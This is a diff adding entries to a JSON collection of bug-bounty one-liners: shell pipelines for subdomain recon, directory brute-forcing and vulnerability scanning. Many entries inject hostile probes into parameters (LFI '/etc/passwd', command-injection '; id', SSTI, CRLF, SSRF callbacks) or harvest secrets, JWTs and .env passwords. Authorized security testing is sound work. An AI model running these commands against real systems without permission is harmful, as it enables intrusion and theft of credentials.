@@ -914,5 +914,205 @@
   {
     "title": "💻 Ultimate Bug Bounty One-Liners - Part 4\n\n**Find API Endpoints Directly from Web Responses**",
     "command": "curl -s https://target.com | grep -oE 'https?://[^\"]+/api/[^\"]+' | sort -u"
+  },
+  {
+    "title": "Comprehensive Vulnerability Scan",
+    "command": "cat urls.txt | httpx -silent -mc 200 | nuclei -silent -t vulnerabilities/ -o results.txt"
+  },
+  {
+    "title": "Subdomain Takeover Scan",
+    "command": "subfinder -d example.com -silent | httpx -silent | nuclei -silent -t takeovers/ -o takeover.txt"
+  },
+  {
+    "title": "Subdomain Discovery and Live Host Check",
+    "command": "subfinder -d target.com -silent | httpx -silent -mc 200"
+  },
+  {
+    "title": "Directory Bruteforcing with FFUF",
+    "command": "ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200"
+  },
+  {
+    "title": "Find Open Redirects using GF Patterns",
+    "command": "cat urls.txt | gf redirect | httpx -silent"
+  },
+  {
+    "title": "XSS Scanning with Dalfox",
+    "command": "cat urls.txt | dalfox pipe --skip-bav --only-poc"
+  },
+  {
+    "title": "SQL Injection Scanning with SQLMap",
+    "command": "cat urls.txt | gf sqli | sqlmap --batch --random-agent -m -"
+  },
+  {
+    "title": "Find Sensitive Backup and Config Files via Wayback Machine",
+    "command": "cat urls.txt | waybackurls | grep -iE '\\.(bak|old|backup|log|env|sql|config)$' | httpx -silent -mc 200"
+  },
+  {
+    "title": "CORS Misconfiguration Detection",
+    "command": "cat urls.txt | corscanner"
+  },
+  {
+    "title": "Technology Detection and CVE Scanning",
+    "command": "cat urls.txt | httpx -silent -title -tech-detect | nuclei -silent -t cves/"
+  },
+  {
+    "title": "Discover URL Parameters from Wayback Machine",
+    "command": "cat urls.txt | waybackurls | uro | grep '?'"
+  },
+  {
+    "title": "Full Recon Chain (Subdomains, Live Check, Tech, Titles)",
+    "command": "subfinder -d target.com -silent | httpx -silent -title -tech-detect"
+  },
+  {
+    "title": "Fast Subdomain Enumeration and Port Scan",
+    "command": "subfinder -d target.com -silent | naabu -silent -top-ports 1000"
+  },
+  {
+    "title": "Gather All Known URLs for a Domain",
+    "command": "gau target.com | tee urls.txt"
+  },
+  {
+    "title": "Find Secrets and API Keys in JavaScript Files",
+    "command": "cat urls.txt | grep '\\.js$' | httpx -silent -mc 200 | xargs -I{} bash -c 'curl -s {} | gf secrets'"
+  },
+  {
+    "title": "Find Exposed S3 Buckets",
+    "command": "subfinder -d target.com -silent | httpx -silent | nuclei -silent -t aws/s3-detect.yaml"
+  },
+  {
+    "title": "Find Exposed Login Panels",
+    "command": "cat urls.txt | nuclei -silent -t exposed-panels/"
+  },
+  {
+    "title": "Test All URL Parameters for Reflected XSS",
+    "command": "cat urls.txt | gf xss | dalfox pipe --skip-bav --only-poc"
+  },
+  {
+    "title": "Check for Exposed .git Repositories",
+    "command": "cat urls.txt | httpx -silent -path \"/.git/config\" -mc 200 -mr \"[core]\""
+  },
+  {
+    "title": "Extract and Uniq All URL Parameters",
+    "command": "cat urls.txt | uro | grep '?' | sort -u"
+  },
+  {
+    "title": "WordPress Vulnerability Scan",
+    "command": "cat urls.txt | nuclei -silent -t technologies/wordpress/"
+  },
+  {
+    "title": "Hunt for CRLF Injection",
+    "command": "cat urls.txt | gf crlf | qsreplace '%0d%0aTestHeader:TestValue' | httpx -silent -hr"
+  },
+  {
+    "title": "Test All URL Parameters for LFI (Local File Inclusion)",
+    "command": "cat urls.txt | gf lfi | qsreplace '/etc/passwd' | httpx -silent -mc 200 -mr 'root:x'"
+  },
+  {
+    "title": "MEGA SCAN: Subdomains, Live Check, CVEs, and Panels",
+    "command": "subfinder -d target.com -silent | httpx -silent -mc 200 | tee alive.txt | nuclei -silent -t cves/,exposed-panels/"
+  },
+  {
+    "title": "Automated SSRF Discovery with Interactsh",
+    "command": "interactsh-client -o interactsh.log & cat urls.txt | gf ssrf | qsreplace 'http://{{interactsh-url}}' | httpx -silent"
+  },
+  {
+    "title": "Visual Reconnaissance of Subdomains",
+    "command": "subfinder -d target.com -silent | httpx -silent | aquatone -out visual_recon"
+  },
+  {
+    "title": "Find Subdomains and Scan for Web Application Firewalls (WAF)",
+    "command": "subfinder -d target.com -silent | httpx -silent -waf"
+  },
+  {
+    "title": "Extract API Endpoints from JavaScript Files",
+    "command": "cat urls.txt | grep '\\.js$' | httpx -mc 200 -silent | xargs -I@ curl -s @ | grep -Eo '(\\/api\\/|\\/v[0-9]+\\/)[^\"\\''\\`]+'"
+  },
+  {
+    "title": "Server-Side Template Injection (SSTI) Check",
+    "command": "cat urls.txt | gf ssti | qsreplace '{{7*7}}' | httpx -silent -mc 200 -mr '49'"
+  },
+  {
+    "title": "Hunt for Prototype Pollution Vulnerabilities",
+    "command": "cat urls.txt | gf prototype-pollution | qsreplace '__proto__[pp-test]=yes' | httpx -silent"
+  },
+  {
+    "title": "Discover Subdomains using Amass (Deep Dive)",
+    "command": "amass enum -passive -d target.com -o domains.txt"
+  },
+  {
+    "title": "Find Leaked JWT Tokens in Web Responses",
+    "command": "gau target.com | httpx -silent -mc 200 -body | grep -E 'ey[A-Za-z0-9_-]+\\.ey[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+'"
+  },
+  {
+    "title": "Scan for Exposed Docker Registries",
+    "command": "subfinder -d target.com -silent | httpx -ports 5000 -silent -path /v2/_catalog -mc 200"
+  },
+  {
+    "title": "Check for HTTP Request Smuggling",
+    "command": "cat alive.txt | nuclei -t http/request-smuggling/"
+  },
+  {
+    "title": "Fuzz HTTP Headers for Bugs",
+    "command": "cat alive.txt | xargs -I@ ffuf -u @ -H 'FUZZ: fuzz' -w headers.txt"
+  },
+  {
+    "title": "Detect GraphQL Endpoints and Run Introspection Query",
+    "command": "subfinder -d target.com -silent | httpx -silent -path /graphql -mc 200 | xargs -I@ nuclei -t exposures/graphql-api-introspection.yaml -u @"
+  },
+  {
+    "title": "Mass DNS Record Querying for a list of subdomains",
+    "command": "cat subdomains.txt | dnsx -a -aaaa -cname -mx -txt -silent"
+  },
+  {
+    "title": "Identify Cloud Assets (AWS, GCP, Azure)",
+    "command": "cat subdomains.txt | dnsx -cname -resp | grep -E 'amazonaws.com|google.com|windows.net'"
+  },
+  {
+    "title": "Recursive Directory Bruteforcing with Gobuster",
+    "command": "gobuster dir -u https://target.com -w /path/to/wordlist.txt -x .php,.html -r"
+  },
+  {
+    "title": "Find Command Injection Vulnerabilities",
+    "command": "cat urls.txt | gf command-injection | qsreplace '; id' | httpx -silent -mc 200 -mr 'uid='"
+  },
+  {
+    "title": "Scan for Log4Shell (CVE-2021-44228)",
+    "command": "cat urls.txt | nuclei -t vulnerabilities/log4j/log4shell-jndi-injection.yaml"
+  },
+  {
+    "title": "Extract IPs and find ASN Information",
+    "command": "subfinder -d target.com -silent | dnsx -a -resp-only | mapcidr -silent | asnmap -silent"
+  },
+  {
+    "title": "Generate a Custom Wordlist from Target's URLs",
+    "command": "gau target.com | unfurl -u keys | sort -u > params.txt && gau target.com | unfurl -u paths | sed 's#^/##' | sort -u > paths.txt"
+  },
+  {
+    "title": "Comprehensive Recon and Vulnerability Scanning Pipeline",
+    "command": "subfinder -d target.com | httpx -silent -title -tech-detect | tee hosts.txt | nuclei -t cves/,misconfiguration/,exposures/ -o findings.txt"
+  },
+  {
+    "title": "Find Hidden Virtual Hosts (VHost Bruteforcing)",
+    "command": "ffuf -w vhosts.txt -u http://target.com -H 'Host: FUZZ.target.com' -fs 1234"
+  },
+  {
+    "title": "Extract All Comments from Web Pages",
+    "command": "cat urls.txt | httpx -silent -body | html-tool comments"
+  },
+  {
+    "title": "Detect Weak SSL/TLS Ciphers",
+    "command": "cat alive.txt | nuclei -t ssl/weak-cipher-suites.yaml"
+  },
+  {
+    "title": "Check for Exposed .env Files",
+    "command": "subfinder -d target.com | httpx -silent -path /.env -mc 200 -mr 'DB_PASSWORD='"
+  },
+  {
+    "title": "Full JS Analysis for Secrets and Endpoints",
+    "command": "gau target.com | grep '\\.js' | httpx -status-code -mc 200 -silent | xargs -I@ bash -c 'echo @ && curl -s @ | rush'"
+  },
+  {
+    "title": "Wayback Machine Recon and Vulnerability Scan",
+    "command": "waybackurls target.com | httpx -silent | nuclei -t vulnerabilities/,misconfiguration/"
   }
 ]
